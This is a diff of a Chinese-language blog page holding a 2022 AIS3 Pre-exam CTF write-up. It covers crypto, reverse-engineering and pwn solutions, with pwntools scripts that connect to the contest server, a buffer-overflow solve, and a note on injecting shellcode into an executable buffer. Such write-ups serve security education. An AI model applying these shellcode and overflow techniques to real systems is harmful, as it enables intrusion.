@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="2022 AIS3 Pre-exam write-up, Gunjyo&#39;s Blog">
-    <meta name="description" content="2022 AIS3 Pre-exam write-up，6/30日前不公開題解">
+    <meta name="description" content="2022/6/30日前不公開題解">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -405,7 +405,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    3.1k
+                    3.3k
                 </div>
                 
 
@@ -472,19 +472,16 @@
         <pre class=" language-py"><code class="language-py">import string
 import random
 
-
 def shuffle(x):
     x = list(x)
     random.shuffle(x)
     return x
-
 
 def encrypt(T, file):
     with open(file) as f:
         pt = f.read()
     with open(f"{file}.enc", "w") as f:
         f.write(pt.translate(T))
-
 
 charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
 shuffled = "".join(shuffle(charset))
@@ -505,7 +502,6 @@ In cryptography, a substitution cipher is a method of encrypting in which units 
 Substitution ciphers can be compared with transposition ciphers. In a transposition cipher, the units of the plaintext are rearranged in a different and usually quite complex order, but the units themselves are left unchanged. By contrast, in a substitution cipher, the units of the plaintext are retained in the same sequence in the ciphertext, but the units themselves are altered.
 
 There are a number of different types of substitution cipher. If the cipher operates on single letters, it is termed a simple substitution cipher; a cipher that operates on larger groups of letters is termed polygraphic. A monoalphabetic cipher uses fixed substitution over the entire message, whereas a polyalphabetic cipher uses a number of substitutions at different positions in the message, where a unit from the plaintext is mapped to one of several possibilities in the ciphertext and vice versa.
-
 
 Contents
 1    Simple substitution
@@ -534,19 +530,16 @@ Contents
         <pre class=" language-py"><code class="language-py">DXPpi6 I6iDwT
 DXPpi6 icwkpX
 
-
 ksq Iz2qqns(8):
     8 = nDI6(8)
     icwkpX.Iz2qqns(8)
     is62iw 8
-
 
 ksq swOijP6(B, qDns):
     FD6z pPsw(qDns) cI q:
         P6 = q.isck()
     FD6z pPsw(q"{qDns}.swO", "F") cI q:
         q.FiD6s(P6.6icwInc6s(B))
-
 
 OzciIs6 = I6iDwT.cIODD_npFsiOcIs + I6iDwT.cIODD_2PPsiOcIs + I6iDwT.kDTD6I
 Iz2qqnsk = "".fpDw(Iz2qqns(OzciIs6))
@@ -567,7 +560,6 @@ xw OijP6pTicPzj, c I24I6D626Dpw ODPzsi DI c Xs6zpk pq swOijP6DwT Dw FzDOz 2wD6I 
 v24I6D626Dpw ODPzsiI Ocw 4s OpXPcisk FD6z 6icwIPpID6Dpw ODPzsiI. xw c 6icwIPpID6Dpw ODPzsi, 6zs 2wD6I pq 6zs PncDw6s86 cis isciicwTsk Dw c kDqqsisw6 cwk 2I2cnnj 12D6s OpXPns8 piksi, 426 6zs 2wD6I 6zsXIsnCsI cis nsq6 2wOzcwTsk. Qj Opw6icI6, Dw c I24I6D626Dpw ODPzsi, 6zs 2wD6I pq 6zs PncDw6s86 cis is6cDwsk Dw 6zs IcXs Is12swOs Dw 6zs ODPzsi6s86, 426 6zs 2wD6I 6zsXIsnCsI cis cn6sisk.
 
 Bzsis cis c w2X4si pq kDqqsisw6 6jPsI pq I24I6D626Dpw ODPzsi. xq 6zs ODPzsi pPsic6sI pw IDwTns ns66siI, D6 DI 6siXsk c IDXPns I24I6D626Dpw ODPzsi; c ODPzsi 6zc6 pPsic6sI pw nciTsi Tip2PI pq ns66siI DI 6siXsk PpnjTicPzDO. 5 XpwpcnPzc4s6DO ODPzsi 2IsI qD8sk I24I6D626Dpw pCsi 6zs sw6Dis XsIIcTs, FzsiscI c PpnjcnPzc4s6DO ODPzsi 2IsI c w2X4si pq I24I6D626DpwI c6 kDqqsisw6 PpID6DpwI Dw 6zs XsIIcTs, Fzsis c 2wD6 qipX 6zs PncDw6s86 DI XcPPsk 6p pws pq IsCsicn PpIID4DnD6DsI Dw 6zs ODPzsi6s86 cwk CDOs CsiIc.
-
 
 3pw6sw6I
 W    vDXPns I24I6D626Dpw
@@ -608,13 +600,11 @@ WG    Z86siwcn nDwaI
 
 M <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span>
 
-
 <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token comment" spellcheck="true"># this is a *fast* function</span>
     <span class="token keyword">return</span> <span class="token punctuation">(</span>
         <span class="token number">4</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0x48763</span>
     <span class="token punctuation">)</span> <span class="token operator">%</span> M
-
 
 <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>pt<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
     ct <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
@@ -622,7 +612,6 @@ M <span class="token operator">=</span> <span class="token number">2</span><span
         ct<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c <span class="token operator">^</span> <span class="token punctuation">(</span>key <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
         key <span class="token operator">=</span> f<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
     <span class="token keyword">return</span> bytes<span class="token punctuation">(</span>ct<span class="token punctuation">)</span>
-
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
     key <span class="token operator">=</span> randbelow<span class="token punctuation">(</span>M<span class="token punctuation">)</span>
@@ -645,7 +634,6 @@ M <span class="token operator">=</span> <span class="token number">2</span><span
 <p>sol.py</p>
 <pre class=" language-python"><code class="language-python">M <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span>
 <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token comment" spellcheck="true"># this is a *fast* function</span>
     <span class="token keyword">return</span> <span class="token punctuation">(</span>
         <span class="token number">4</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> x<span class="token operator">**</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">0x48763</span>
     <span class="token punctuation">)</span> <span class="token operator">%</span> M
@@ -689,7 +677,27 @@ key <span class="token operator">=</span> <span class="token punctuation">(</spa
     <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
 </code></pre>
 <p>Flag <code>AIS3{kn0ckKNOCKknock}</code></p>
-<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a>Time Management</h3><h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><p>和去年一樣是 Net 相關題<br>用 <code>dnSpy</code> 打開 <code>AIS3*dll</code> 檔案們，可以在框起來的幾個檔案中看到很多條件，將他們整理一下<br><img src="https://i.imgur.com/NpIy5Rp.png"></p>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a>Time Management</h3><p>IDA Pro 看一下 main</p>
+<p><img src="https://i.imgur.com/tyatVhK.png"></p>
+<p>我們有 secret[] 和 key[]，所以只要照著把 v4 推出來就可以了</p>
+<pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span>
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">int</span> secret<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">861096257</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1869572219</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1601790322</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1769108595</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1601398638</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1633645417</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2036430700</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">1851875187</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1702065503</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1600943462</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1835888483</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2103733857</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">973148161</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">822358554</span><span class="token punctuation">,</span><span class="token number">4542272</span><span class="token punctuation">,</span><span class="token number">69014578</span><span class="token punctuation">,</span><span class="token number">973799469</span><span class="token punctuation">,</span><span class="token number">203030572</span><span class="token punctuation">,</span><span class="token number">222171395</span><span class="token punctuation">,</span><span class="token number">739379761</span><span class="token punctuation">,</span><span class="token number">436220160</span><span class="token punctuation">,</span><span class="token number">1280056077</span><span class="token punctuation">,</span><span class="token number">1043142173</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> res<span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">23</span><span class="token punctuation">;</span> i <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+        res <span class="token operator">=</span> secret<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>secret<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            res <span class="token operator">>>=</span> <span class="token number">8</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Flag <code>AIS3{You_are_the_master_of_time_management!!!!!}</code></p>
+<h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><p>和去年一樣是 Net 相關題<br>用 <code>dnSpy</code> 打開 <code>AIS3*dll</code> 檔案們，可以在框起來的幾個檔案中看到很多條件，將他們整理一下<br><img src="https://i.imgur.com/NpIy5Rp.png"></p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># AIS3</span>
 <span class="token comment" spellcheck="true">#       012345678901234</span>
 <span class="token comment" spellcheck="true"># r = 'AIS3{'</span>
@@ -842,7 +850,9 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <p>Flag <code>AIS3{Re@1_B0F_m4st3r!!}</code></p>
-<h3 id="Give-Me-SC"><a href="#Give-Me-SC" class="headerlink" title="Give Me SC"></a>Give Me SC</h3><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/47048">shellcode 來源</a></p>
+<h3 id="Give-Me-SC"><a href="#Give-Me-SC" class="headerlink" title="Give Me SC"></a>Give Me SC</h3><pre class=" language-c"><code class="language-c"><span class="token function">mprotect</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE <span class="token operator">|</span> PROT_EXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>從這可以看到執行權限是開著的<br>它會返回到 bss 端執行 shellcode，所以我們把 shellcode 傳進去然後執行<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes/47048">shellcode 來源</a></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
 r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chals1.ais3.org'</span><span class="token punctuation">,</span><span class="token number">15566</span><span class="token punctuation">)</span>
@@ -1002,7 +1012,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2022 AIS3 Pre-exam write-up，6/30日前不公開題解
+                            2022/6/30日前不公開題解
                         
                     </div>
                     <div class="publish-info">
